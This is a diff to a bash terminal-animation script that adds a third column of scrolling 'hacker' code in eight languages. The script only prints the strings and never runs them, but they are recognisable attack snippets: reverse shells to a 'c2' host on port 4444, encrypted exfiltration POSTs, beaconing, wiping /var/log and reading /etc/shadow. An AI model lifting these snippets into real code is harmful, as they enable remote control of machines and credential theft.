@@ -317,6 +317,284 @@ LANG_INFO=(
     "Lingo|John H. Thompson (Macromedia)|1988"
 )
 
+# Modern languages for third column
+LANG3_INFO=(
+    "Rust|Graydon Hoare (Mozilla)|2010"
+    "Go|Rob Pike, Ken Thompson (Google)|2009"
+    "Swift|Chris Lattner (Apple)|2014"
+    "Kotlin|JetBrains|2011"
+    "TypeScript|Anders Hejlsberg (Microsoft)|2012"
+    "Zig|Andrew Kelley|2016"
+    "Python|Guido van Rossum|1991"
+    "Ruby|Yukihiro Matsumoto|1995"
+)
+
+RUST_LINES=(
+    "  fn main() {"
+    "    let payload = vec![0u8; 4096];"
+    "    unsafe { std::ptr::copy(shellcode.as_ptr(),"
+    "      payload.as_mut_ptr(), shellcode.len()) };"
+    "    let sock = TcpStream::connect(c2)?;"
+    "    let mut buf = [0u8; 1024];"
+    "    loop { match sock.read(&mut buf) {"
+    "      Ok(n) => process(&buf[..n]),"
+    "      Err(_) => break, } }"
+    "    std::process::Command::new(\"/bin/sh\")"
+    "      .stdin(Stdio::from(sock.try_clone()?))"
+    "      .stdout(Stdio::from(sock.try_clone()?))"
+    "      .spawn()?;"
+    "    let key: [u8; 32] = rand::random();"
+    "    let cipher = Aes256Gcm::new(&key.into());"
+    "    let encrypted = cipher.encrypt(&nonce, data)?;"
+    "    fs::remove_dir_all(\"/var/log\")?;"
+    "    eprintln!(\"[+] Tracks cleared\");"
+    "    impl Drop for Rootkit {"
+    "      fn drop(&mut self) { self.cleanup(); }"
+    "    }"
+    "    #[derive(Debug)] struct Exploit {"
+    "      target: String,"
+    "      payload: Vec<u8>,"
+    "    }"
+    "    pub async fn exfiltrate(data: &[u8]) -> Result<()> {"
+    "      let client = reqwest::Client::new();"
+    "      client.post(C2_URL).body(data.to_vec()).send().await?;"
+    "      Ok(())"
+    "    }"
+)
+
+GO_LINES=(
+    "  func main() {"
+    "    conn, _ := net.Dial(\"tcp\", c2+\":4444\")"
+    "    cmd := exec.Command(\"/bin/sh\")"
+    "    cmd.Stdin = conn"
+    "    cmd.Stdout = conn"
+    "    cmd.Stderr = conn"
+    "    cmd.Run()"
+    "    key := make([]byte, 32)"
+    "    rand.Read(key)"
+    "    block, _ := aes.NewCipher(key)"
+    "    gcm, _ := cipher.NewGCM(block)"
+    "    nonce := make([]byte, gcm.NonceSize())"
+    "    encrypted := gcm.Seal(nonce, nonce, data, nil)"
+    "    http.Post(c2+\"/exfil\", \"application/octet-stream\","
+    "      bytes.NewReader(encrypted))"
+    "    os.RemoveAll(\"/var/log\")"
+    "    go func() {"
+    "      for range time.Tick(30 * time.Second) {"
+    "        beacon(c2)"
+    "      }"
+    "    }()"
+    "    type Exploit struct {"
+    "      Target  string \`json:\"target\"\`"
+    "      Payload []byte \`json:\"payload\"\`"
+    "    }"
+    "    scanner := bufio.NewScanner(conn)"
+    "    for scanner.Scan() {"
+    "      exec.Command(\"sh\", \"-c\", scanner.Text()).Run()"
+    "    }"
+    "    defer conn.Close()"
+)
+
+SWIFT_LINES=(
+    "  import Foundation"
+    "  let task = Process()"
+    "  task.executableURL = URL(fileURLWithPath: \"/bin/sh\")"
+    "  let pipe = Pipe()"
+    "  task.standardOutput = pipe"
+    "  try task.run()"
+    "  let data = pipe.fileHandleForReading.readDataToEndOfFile()"
+    "  let sock = try Socket.create(family: .inet)"
+    "  try sock.connect(to: c2, port: 4444)"
+    "  guard let key = SymmetricKey(size: .bits256) else { return }"
+    "  let sealed = try AES.GCM.seal(payload, using: key)"
+    "  let url = URL(string: \"\\(c2)/exfil\")!"
+    "  var req = URLRequest(url: url)"
+    "  req.httpMethod = \"POST\""
+    "  req.httpBody = sealed.combined"
+    "  URLSession.shared.dataTask(with: req).resume()"
+    "  try FileManager.default.removeItem(atPath: \"/var/log\")"
+    "  class Rootkit: NSObject {"
+    "    @objc dynamic func inject() {"
+    "      let hook = dlsym(RTLD_DEFAULT, \"open\")"
+    "      // swizzle syscall table"
+    "    }"
+    "  }"
+    "  DispatchQueue.global().async {"
+    "    while true {"
+    "      Thread.sleep(forTimeInterval: 30)"
+    "      beacon(c2: server)"
+    "    }"
+    "  }"
+)
+
+KOTLIN_LINES=(
+    "  fun main() {"
+    "    val socket = Socket(c2, 4444)"
+    "    val proc = Runtime.getRuntime().exec(\"/bin/sh\")"
+    "    val input = socket.getInputStream()"
+    "    val output = socket.getOutputStream()"
+    "    proc.inputStream.copyTo(output)"
+    "    input.copyTo(proc.outputStream)"
+    "    val key = KeyGenerator.getInstance(\"AES\").apply {"
+    "      init(256) }.generateKey()"
+    "    val cipher = Cipher.getInstance(\"AES/GCM/NoPadding\")"
+    "    cipher.init(Cipher.ENCRYPT_MODE, key)"
+    "    val encrypted = cipher.doFinal(payload)"
+    "    val client = OkHttpClient()"
+    "    val request = Request.Builder()"
+    "      .url(\"\$c2/exfil\")"
+    "      .post(encrypted.toRequestBody())"
+    "      .build()"
+    "    client.newCall(request).execute()"
+    "    File(\"/var/log\").deleteRecursively()"
+    "    data class Exploit("
+    "      val target: String,"
+    "      val payload: ByteArray"
+    "    )"
+    "    GlobalScope.launch {"
+    "      while(true) {"
+    "        delay(30_000)"
+    "        beacon(c2)"
+    "      }"
+    "    }"
+)
+
+TYPESCRIPT_LINES=(
+    "  import { createConnection } from 'net';"
+    "  const conn = createConnection(4444, c2);"
+    "  const shell = spawn('/bin/sh', ['-i']);"
+    "  shell.stdout.pipe(conn);"
+    "  conn.pipe(shell.stdin);"
+    "  interface Exploit {"
+    "    target: string;"
+    "    payload: Buffer;"
+    "    timestamp: number;"
+    "  }"
+    "  const key = crypto.randomBytes(32);"
+    "  const iv = crypto.randomBytes(16);"
+    "  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);"
+    "  const encrypted: Buffer = Buffer.concat(["
+    "    cipher.update(data), cipher.final()]);"
+    "  await axios.post<void>(\`\${c2}/exfil\`, encrypted, {"
+    "    headers: { 'Content-Type': 'application/octet-stream' }"
+    "  });"
+    "  const scanPorts = async (host: string): Promise<number[]> => {"
+    "    const open: number[] = [];"
+    "    for (let p = 1; p < 65536; p++) {"
+    "      if (await probe(host, p)) open.push(p);"
+    "    }"
+    "    return open;"
+    "  };"
+    "  fs.rmSync('/var/log', { recursive: true, force: true });"
+    "  type C2Response = { cmd: string; args: string[] };"
+    "  setInterval(() => beacon(c2), 30_000);"
+)
+
+ZIG_LINES=(
+    "  const std = @import(\"std\");"
+    "  pub fn main() !void {"
+    "    const sock = try std.net.tcpConnectToHost(c2, 4444);"
+    "    defer sock.close();"
+    "    var buf: [4096]u8 = undefined;"
+    "    while (true) {"
+    "      const n = try sock.read(&buf);"
+    "      if (n == 0) break;"
+    "      try process(buf[0..n]);"
+    "    }"
+    "    const key = std.crypto.random.bytes(32);"
+    "    var enc: [data.len]u8 = undefined;"
+    "    std.crypto.aead.encrypt(&enc, data, key);"
+    "    const alloc = std.heap.page_allocator;"
+    "    var payload = try alloc.alloc(u8, 4096);"
+    "    defer alloc.free(payload);"
+    "    @memcpy(payload, shellcode);"
+    "    std.fs.deleteTree(\"/var/log\") catch {};"
+    "    std.log.info(\"[+] Tracks cleared\", .{});"
+    "    const Exploit = struct {"
+    "      target: []const u8,"
+    "      payload: []u8,"
+    "    };"
+    "    try std.os.execve(\"/bin/sh\", &.{}, environ);"
+    "    var timer = try std.time.Timer.start();"
+    "    std.time.sleep(30 * std.time.ns_per_s);"
+    "    try beacon(c2);"
+)
+
+PYTHON_LINES=(
+    "  import socket, subprocess, os"
+    "  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
+    "  s.connect((c2, 4444))"
+    "  os.dup2(s.fileno(), 0)"
+    "  os.dup2(s.fileno(), 1)"
+    "  subprocess.call(['/bin/sh', '-i'])"
+    "  from cryptography.fernet import Fernet"
+    "  key = Fernet.generate_key()"
+    "  f = Fernet(key)"
+    "  encrypted = f.encrypt(stolen_data)"
+    "  requests.post(f'{c2}/exfil', data=encrypted)"
+    "  import shutil"
+    "  shutil.rmtree('/var/log', ignore_errors=True)"
+    "  class Rootkit:"
+    "    def __init__(self, target: str):"
+    "      self.target = target"
+    "      self.payload = b'\\x90' * 4096"
+    "    def inject(self) -> bool:"
+    "      ctypes.memmove(addr, self.payload, len(self.payload))"
+    "      return True"
+    "  async def beacon(c2: str) -> None:"
+    "    while True:"
+    "      await asyncio.sleep(30)"
+    "      async with aiohttp.ClientSession() as s:"
+    "        await s.get(f'{c2}/ping')"
+    "  with open('/etc/shadow', 'r') as f:"
+    "    for line in f: exfil(line.strip())"
+)
+
+RUBY_LINES=(
+    "  require 'socket'"
+    "  sock = TCPSocket.new(c2, 4444)"
+    "  exec '/bin/sh', in: sock, out: sock, err: sock"
+    "  require 'openssl'"
+    "  cipher = OpenSSL::Cipher::AES256.new(:GCM)"
+    "  cipher.encrypt"
+    "  key = cipher.random_key"
+    "  encrypted = cipher.update(data) + cipher.final"
+    "  Net::HTTP.post(URI(\"#{c2}/exfil\"), encrypted)"
+    "  FileUtils.rm_rf('/var/log')"
+    "  class Exploit"
+    "    attr_accessor :target, :payload"
+    "    def initialize(target)"
+    "      @target = target"
+    "      @payload = \"\\x90\" * 4096"
+    "    end"
+    "    def run!"
+    "      inject(@payload)"
+    "      puts '[+] Exploit successful'"
+    "    end"
+    "  end"
+    "  Thread.new do"
+    "    loop { sleep(30); beacon(c2) }"
+    "  end"
+    "  File.readlines('/etc/shadow').each do |line|"
+    "    exfiltrate(line.chomp)"
+    "  end"
+)
+
+# Third column: modern language per machine
+ALL_CODE_LINES3=()
+case $((ART_SEED % 8)) in
+    0) ALL_CODE_LINES3=("${RUST_LINES[@]}") ;;
+    1) ALL_CODE_LINES3=("${GO_LINES[@]}") ;;
+    2) ALL_CODE_LINES3=("${SWIFT_LINES[@]}") ;;
+    3) ALL_CODE_LINES3=("${KOTLIN_LINES[@]}") ;;
+    4) ALL_CODE_LINES3=("${TYPESCRIPT_LINES[@]}") ;;
+    5) ALL_CODE_LINES3=("${ZIG_LINES[@]}") ;;
+    6) ALL_CODE_LINES3=("${PYTHON_LINES[@]}") ;;
+    7) ALL_CODE_LINES3=("${RUBY_LINES[@]}") ;;
+esac
+CODE3_COUNT=${#ALL_CODE_LINES3[@]}
+LANG3_IDX=$((ART_SEED % 8))
+
 LANG1_IDX=$((ART_SEED % 6))
 LANG2_IDX=$(( (ART_SEED + 3) % 6 ))
 CODE_IDX=0
@@ -338,42 +616,40 @@ matrix_transition() {
 
     IFS='|' read -r lang1_name lang1_creator lang1_year <<< "${LANG_INFO[$LANG1_IDX]}"
     IFS='|' read -r lang2_name lang2_creator lang2_year <<< "${LANG_INFO[$LANG2_IDX]}"
+    IFS='|' read -r lang3_name lang3_creator lang3_year <<< "${LANG3_INFO[$LANG3_IDX]}"
 
-    # Dual language header banner
+    # Triple language header banner
     echo
-    echo -e "  ${W}╔══════════════════════════════╦══════════════════════════════╗${N}"
-    printf  "  ${W}║${N}  ${C}%-28s${N}${W}║${N}  ${C}%-28s${N}${W}║${N}\n" "${lang1_name}" "${lang2_name}"
-    printf  "  ${W}║${N}  ${DG}%-28s${N}${W}║${N}  ${DG}%-28s${N}${W}║${N}\n" "${lang1_creator}, ${lang1_year}" "${lang2_creator}, ${lang2_year}"
-    echo -e "  ${W}╚══════════════════════════════╩══════════════════════════════╝${N}"
+    echo -e "  ${W}╔════════════════════╦════════════════════╦════════════════════╗${N}"
+    printf  "  ${W}║${N} ${C}%-19s${N}${W}║${N} ${C}%-19s${N}${W}║${N} ${C}%-19s${N}${W}║${N}\n" "${lang1_name}" "${lang2_name}" "${lang3_name}"
+    printf  "  ${W}║${N} ${DG}%-19s${N}${W}║${N} ${DG}%-19s${N}${W}║${N} ${DG}%-19s${N}${W}║${N}\n" "${lang1_year}" "${lang2_year}" "${lang3_year}"
+    echo -e "  ${W}╚════════════════════╩════════════════════╩════════════════════╝${N}"
     echo
     sleep 0.5
 
-    local HALF=$(( (COLS / 2) - 2 ))
+    local THIRD=$(( (COLS / 3) - 1 ))
     local code2_idx=$((CODE_IDX + 17))
+    local code3_idx=$((CODE_IDX + 7))
 
     for ((l=0; l<ROWS; l++)); do
         local c1="${colors[$((RANDOM % ${#colors[@]}))]}"
         local c2="${colors[$((RANDOM % ${#colors[@]}))]}"
+        local c3="${colors[$((RANDOM % ${#colors[@]}))]}"
+        local col1 col2 col3
 
-        # Left column: primary language or hex
-        local left right
-        if (( RANDOM % 4 != 0 )); then
-            left="${ALL_CODE_LINES[$((CODE_IDX % CODE_COUNT))]}"
-            CODE_IDX=$((CODE_IDX + 1))
-        else
-            left="$(printf '0x%08x: %02x%02x %02x%02x %02x%02x %02x%02x' $((RANDOM*RANDOM)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))"
-        fi
+        # Column 1: primary language
+        col1="${ALL_CODE_LINES[$((CODE_IDX % CODE_COUNT))]}"
+        CODE_IDX=$((CODE_IDX + 1))
 
-        # Right column: secondary language or hex
-        if (( RANDOM % 4 != 0 )); then
-            right="${ALL_CODE_LINES2[$((code2_idx % CODE2_COUNT))]}"
-            code2_idx=$((code2_idx + 1))
-        else
-            right="$(printf '0x%08x: %02x%02x %02x%02x %02x%02x' $((RANDOM*RANDOM)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))"
-        fi
+        # Column 2: secondary language
+        col2="${ALL_CODE_LINES2[$((code2_idx % CODE2_COUNT))]}"
+        code2_idx=$((code2_idx + 1))
 
-        # Pad and print both columns
-        printf "${c1}%-${HALF}s${DG}│${c2}%-${HALF}s${N}\n" "${left:0:$HALF}" "${right:0:$HALF}"
+        # Column 3: modern language
+        col3="${ALL_CODE_LINES3[$((code3_idx % CODE3_COUNT))]}"
+        code3_idx=$((code3_idx + 1))
+
+        printf "${c1}%-${THIRD}s${DG}│${c2}%-${THIRD}s${DG}│${c3}%-${THIRD}s${N}\n" "${col1:0:$THIRD}" "${col2:0:$THIRD}" "${col3:0:$THIRD}"
         sleep 0.02
     done
 }
